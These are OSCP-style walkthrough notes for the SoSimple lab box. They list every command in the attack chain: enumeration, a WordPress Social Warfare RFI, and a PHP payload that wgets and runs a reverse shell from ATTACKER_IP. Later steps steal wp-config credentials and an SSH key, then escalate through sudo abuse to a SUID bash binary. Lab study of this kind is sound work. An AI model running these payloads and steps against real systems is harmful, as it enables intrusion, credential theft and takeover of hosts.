This document provides a comprehensive summary of the methodology and a complete list of commands used in the **"Box Walkthrough with S1REN\! (SoSimple) (PG-Play)"** video. This guide is structured to mirror the standard penetration testing process, focusing on the techniques essential for the OSCP exam.

## 📝 Comprehensive OSCP Walkthrough Notes & Commands (SoSimple)

The *SoSimple* box walkthrough demonstrates a classic chain of exploitation: **Vulnerable Web App (RFI) → Credential Stealing → SSH Key Discovery → Sudo Abuse (User to User) → Sudo Abuse (User to Root)**.

### I. Initial Enumeration and Reconnaissance

The initial phase identifies open services and the target operating system.

| Step | Command | Description |
| :--- | :--- | :--- |
| **Nmap Scan** | `nmap -p- -sV -sC -T4 [Target IP] --open` | Full port scan, service version detection (`-sV`), and default script check (`-sC`). |
| **Banner Grab** | `nc -nv [Target IP] 22` | Confirms the SSH service version, which reveals the OS as **Ubuntu**. |
| **Open Ports** | `80/tcp` (HTTP - Apache) and `22/tcp` (SSH) are open. | |

-----

### II. Web Enumeration & Initial Foothold (RFI)

The focus shifts to the HTTP service on port 80, which leads to a vulnerable WordPress installation.

#### A. WordPress Discovery

| Step | Command | Description |
| :--- | :--- | :--- |
| **Directory Fuzzing** | `wfuzz -c -z file,/opt/seclists/Discovery/Web-Content/raft-large-directories.txt --hh 404 http://[Target IP]/FUZZ/` | Used to discover hidden directories. Finds the **/wordpress** installation. |
| **WPScan** | `wpscan --url http://[Target IP]/wordpress/ --enumerate p --aggressive` | Aggressively enumerates plugins (`-e p`) on the WordPress site. |
| **Vulnerability**| Finds **Social Warfare Plugin v3.5.0** (Vulnerable to RCE/RFI). | |
| **Exploit Search**| `searchsploit social warfare 3.5.0` | Confirms the vulnerability and finds the exploit code. |

#### B. Exploitation (Remote File Inclusion - RFI)

The vulnerability is exploited using a **Remote File Inclusion (RFI)** attack to gain remote code execution and a reverse shell.

| Step | Command | Description |
| :--- | :--- | :--- |
| **Payload Setup** | `msfvenom -p linux/x86/shell_reverse_tcp LHOST=[ATTACKER_IP] LPORT=1990 -f elf -o offsec` | Generates a 32-bit Linux reverse shell executable. |
| **HTTP Server** | `python3 -m http.server 8000` | Used to host the `offsec` reverse shell payload for the target to download. |
| **Netcat Listener** | `nc -nlvp 1990` | Sets up a listener to catch the reverse shell connection. |
| **Malicious PHP** | **Script Content for `payload.txt`:**<br> `<?php system("wget http://[ATTACKER_IP]:8000/offsec -O /tmp/offsec; chmod +x /tmp/offsec; /tmp/offsec &"); ?>` | The payload performs the **Transfer, Permit, Execute (TPE)** chain: downloads the shell, makes it executable, and runs it in the background. |
| **RFI Trigger** | `http://[Target IP]/wordpress/wp-admin/admin-post.php?swp_url=http://[ATTACKER_IP]:8000/payload.txt` | Navigating to this URL triggers the RFI, which executes the PHP `system` command and sends a shell back to the listener. |

-----

### III. Post-Exploitation & Initial Credential Loot

Upon gaining the initial shell as the **`www-data`** user.

| Step | Command | Description |
| :--- | :--- | :--- |
| **TTY Stabilization** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` <br> `Ctrl+Z` then `stty raw -echo` then `fg` | Stabilizes the shell for better interaction and prevents disconnects. |
| **DB Credential Loot** | `cat /var/www/html/wordpress/wp-config.php` | Retrieves the MySQL database credentials. |
| **Database Access** | `mysql -u wp_user -p[DB_PASSWORD]` | Connects to the database using credentials found in `wp-config.php`. |
| **User Discovery** | `use wordpress;`<br>`SELECT user_login FROM wp_users;` | Discovers the system users: **Max** and **Steven**. |
| **SSH Key Loot** | `cat /home/max/.ssh/id_rsa` | Finds the private SSH key for the user Max. |
| **Key Permissions** | `chmod 600 id_rsa` | Sets the required permissions for the key file. |
| **SSH Login** | `ssh max@[Target IP] -i id_rsa` | Uses the stolen key to log in as user **Max**. |

-----

### IV. Privilege Escalation

The final stage involves two steps of privilege escalation to reach `root`.

#### A. User-to-User Escalation (Max to Steven)

| Step | Command | Description |
| :--- | :--- | :--- |
| **Check Sudo** | `sudo -l` | Checks what commands the current user (`max`) can run with elevated privileges. |
| **Sudo Rule Found** | `(Steven) NOPASSWD: /usr/sbin/service` | Max can run the `/usr/sbin/service` utility as user Steven without a password. |
| **Escalate to Steven** | `sudo -u steven /usr/sbin/service ../../bin/bash` | Uses the service binary's ability to execute a program (via a relative path) to spawn a shell as the `steven` user. |

#### B. User-to-Root Escalation (Steven to Root)

| Step | Command | Description |
| :--- | :--- | :--- |
| **Check Sudo** | `sudo -l` | Checks what commands the current user (`steven`) can run. |
| **Sudo Rule Found** | `(root) NOPASSWD: /opt/tools/server-health.sh` | Steven can run the `/opt/tools/server-health.sh` script as **root** without a password. |
| **Malicious Script** | **Script Content for `/opt/tools/server-health.sh`:**<br> `#!/bin/bash`<br>`cp /bin/bash /tmp/dash`<br>`chmod u+s /tmp/dash` | A bash script is created in the specified path to: 1. Copy `/bin/bash` to `/tmp/dash`. 2. Set the **SUID bit** (`u+s`) on the new binary. |
| **Execute Script** | `sudo /opt/tools/server-health.sh` | Runs the malicious script as **root**, creating a SUID shell. |
| **Final Root Shell** | `/tmp/dash -p` | Executes the SUID shell, using the **`-p` flag** (preserve effective privileges) to maintain **root** permissions. |

-----

### V. Key Takeaway Concepts for OSCP

  * **Tool for the Job:** Use specialized tools like **WPScan** for targeted enumeration, rather than relying solely on manual checks.
  * **Transfer, Permit, Execute (TPE):** When direct reverse shells fail, use a chained command (like the one in `payload.txt`) to download a binary, set the executable bit, and execute it.
  * **RFI/LFI:** Always check the file type and encoding when testing inclusion vulnerabilities. RFI often requires including files with PHP code (like `system()`) wrapped in PHP tags.
  * **Loot All Credentials:** Always search for **SSH keys (`id_rsa`)** and **configuration files (`wp-config.php`)** in user home directories and web roots.
  * **Sudo Abuse:** The `sudo -l` command is non-negotiable for privilege escalation. Look up any allowed binaries (e.g., `service`) on sites like **GTFOBins** for known exploit methods.
  * **SUID with `-p`:** When exploiting a SUID binary, remember to use the **`-p`** or equivalent flag to ensure the effective User ID (EUID) is preserved (e.g., EUID=0 for root).

http://googleusercontent.com/youtube_content/0